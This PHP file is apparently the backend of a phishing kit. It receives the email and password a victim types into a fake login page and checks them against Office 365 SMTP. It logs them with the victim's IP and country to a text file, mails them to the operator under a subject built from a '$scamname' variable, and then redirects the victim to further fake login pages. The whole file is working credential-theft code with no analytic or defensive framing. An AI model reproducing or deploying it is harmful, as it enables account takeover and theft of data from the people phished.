<?php
	session_start();
	  $csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$user = strip_tags($_POST['email']);
$pass = strip_tags($_POST['password']);
$type = strip_tags($_POST['type']);
if (isset($_POST['email']) && isset($_POST['password']) ) {
require '../extra/mine.php';
if ($validaccount =="yes") {
require 'PHPMailer/PHPMailerAutoload.php';

$mail = new PHPMailer;
$mail->isSMTP();
$mail->Host = "smtp.office365.com";
$mail->SMTPAuth = true;
$mail->Username = "".$user."";
$mail->Password = "".$pass."";
$mail->SMTPSecure = 'tls';
$mail->Port = "587";                     
$mail->setFrom(''.$user.'', ''.$name.'');
$mail->addAddress(''.$receiver.'');
$mail->isHTML(false);
$bodyContent = ''.$configbody.'';
$mail->Subject = ''.$configsubject.'';
$mail->Body    = $bodyContent;
if(!$mail->send()) {
    if ($type=="nextlogin") {
		$msg="-----------------+ True Login: No +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|F| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: No1r <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
        header("Location: nextlogin?csrftoken=".$csrftoken."&email=".$_POST['email']."&invalid");
  exit();
 }else{
	 $msg="-----------------+ True Login: No +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|F| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: No1r <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
  header("Location: bussnisslogin?csrftoken=".$csrftoken."&email=".$_POST['email']."&invalid");
  exit();
 }

} else {

	$msg="-----------------+ True Login: {$validaccount} +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|T| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: No1r <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
	   echo "<script> window.location.href = '".$gopage."' </script>";
  exit();
}
}if ($validaccount !=="yes") {

	$msg="-----------------+ True Login: {$validaccount} +-----------------\r\n";
	$msg.="Email	: {$user}\r\n";
	$msg.="Password	: {$pass}\r\n";
	$msg.="LOCATION ({$_SESSION['ip']},{$_SESSION['ip_countryName']},{$_SESSION['currency']})\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."|F| {$_SESSION['ip_countryName']} | ".$user." | ";
$headers="From: No1r <contact>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
	   echo "<script> window.location.href = '".$gopage."' </script>";
  exit();
}
}else{
                exit(header('HTTP/1.0 404 Not Found'));
}
?>
